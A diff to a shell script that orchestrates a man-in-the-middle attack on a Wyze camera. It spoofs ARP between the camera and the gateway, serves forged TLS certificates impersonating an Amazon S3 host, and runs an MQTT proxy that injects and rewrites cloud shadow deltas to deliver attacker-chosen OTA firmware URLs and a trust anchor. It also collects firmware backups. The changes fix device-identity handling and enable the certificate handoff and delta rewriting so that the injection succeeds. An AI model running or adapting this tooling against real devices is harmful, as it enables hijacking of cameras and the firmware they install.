@@ -21,16 +21,31 @@ CAM_MAC="${1:-${CAM_MAC:-80:48:2c:4b:cf:0b}}"
 GW="${GW:-192.168.4.1}"
 GWMAC="${GWMAC:-48:dd:0c:c9:ec:0d}"
 UP="${UP:-192.168.4.160}"
-THING="${THING:-80482c4bcf0b}"; DEV="${DEV:-80482C4BCF0B}"
+# Identity follows the target MAC. Both used to be hardcoded to the original demo unit, so arming
+# for the other camera silently ran the cloud session as the wrong thing: the proxy went upstream
+# with the wrong store certificate and every injected delta/command addressed the wrong shadow.
+DEV="${DEV:-$(norm_mac "$CAM_MAC" | tr 'a-f' 'A-F')}"
+THING="${THING:-$(norm_mac "$CAM_MAC" | tr 'A-F' 'a-f')}"
 OTA_URL="${OTA_URL:-https://s3-us-west-2.amazonaws.com/$CAP_PATH}"
 
-norm_mac() { echo "$1" | tr A-F a-f | awk -F: '{ for (i = 1; i <= NF; i++) $i = $i + 0; print }' OFS=:; }
-arp_lookup() {
-  sudo -n /usr/sbin/arp -an 2>/dev/null | awk -v m="$(norm_mac "$CAM_MAC")" '
-    { gsub(/[()]/, "", $2); mac = $4; n = split(mac, o, ":"); out = ""
-      for (i = 1; i <= n; i++) out = out (i > 1 ? ":" : "") (o[i] + 0)
-      if (out == m) { print $2; exit } }'
+# One canonical form: lowercase hex with every octet zero-padded, separators stripped. Both sides go
+# through this, so a colonless MAC (what the launchd plist carries) and arp's unpadded print
+# (`…:52:59:5` for the octet 05) compare equal. Stripping separators alone is not enough — losing
+# `05`→`5` makes the strings different lengths and the lookup silently reports "not on the LAN".
+norm_mac() {
+  local f out=
+  for f in $(echo "$1" | tr 'A-F' 'a-f' | tr ':-.' '   '); do
+    out="$out$(printf '%2s' "$f" | tr ' ' 0)"
+  done
+  echo "$out"
 }
+arp_lookup() {
+  $ARP_CMD -an 2>/dev/null | awk '{ gsub(/[()]/, "", $2); print $2, $4 }' \
+    | while read -r ip mac; do
+        [ -n "$ip" ] && [ "$(norm_mac "$mac")" = "$(norm_mac "$CAM_MAC")" ] && { echo "$ip"; break; }
+      done
+}
+ARP_CMD="${ARP_CMD:-sudo -n /usr/sbin/arp}"
 
 # --- prerequisites -------------------------------------------------------------------------
 [ -x /tmp/sp/bin/python ] || { python3 -m venv /tmp/sp && /tmp/sp/bin/pip -q install scapy; }
@@ -139,7 +154,12 @@ sudo /tmp/sp/bin/python "$HERE/wyze_arp_spoof.py" "$CAM" "$CAM_MAC" "$GW" "$GWMA
 for port in 443 8443; do
   for attempt in 1 2 3; do
     extra=""
-    [ "$port" = 443 ] && [ "${FIRMWARE_DETAIL:-0}" = 1 ] && extra="--firmware-detail"
+    if [ "$port" = 443 ]; then
+      # the certificate handoff is answered here; without this flag the forge passes the call
+      # through to the real cloud and the device never receives our URLs or trust anchor
+      extra="--iot-cert --iot-cert-dir $CERTS/iot"
+      [ "${FIRMWARE_DETAIL:-0}" = 1 ] && extra="$extra --firmware-detail"
+    fi
     sudo "$PY" "$HERE/wyze_forge_serve.py" --dir "$CAP_DIR" --port "$port" \
       --cert /tmp/iot2.pem --key /tmp/iot2.key --intermediate "$CERTS/emudhra/ev-ca-aaa-cross.pem" \
       --sni s3-us-west-2.amazonaws.com $extra >> /tmp/tls.log 2>&1 &
@@ -155,12 +175,15 @@ sudo "$PY" -m http.server 9101 --directory "$CAP_DIR/img" > /tmp/img.log 2>&1 &
 sudo "$PY" "$HERE/wyze_backup_recv.py" --base-port "${PORT:-8446}" --dir /tmp/fwbackup \
   >> /tmp/ota/backup.log 2>&1 &
 if [ "${FOREGROUND:-0}" = 1 ]; then
-  # launchd supervises the proxy in the foreground; the listeners above are its children
-  THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem INJECT=1 OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
+  # launchd supervises the proxy in the foreground; the listeners above are its children.
+  # REWRITE edits the cloud's own wyze-service delta in flight — it is the delivery that has
+  # actually produced fetches, and it was never passed by this script.
+  THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem INJECT=1 REWRITE="${REWRITE:-1}" \
+    OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
     exec "$PY" "$HERE/wyze_mqtt_mitm.py"
 fi
-sudo THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem \
-  INJECT=1 OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
+sudo THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem INJECT=1 REWRITE="${REWRITE:-1}" \
+  OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
   "$PY" "$HERE/wyze_mqtt_mitm.py" > /tmp/mqproxy.log 2>&1 &
 sleep 3
 
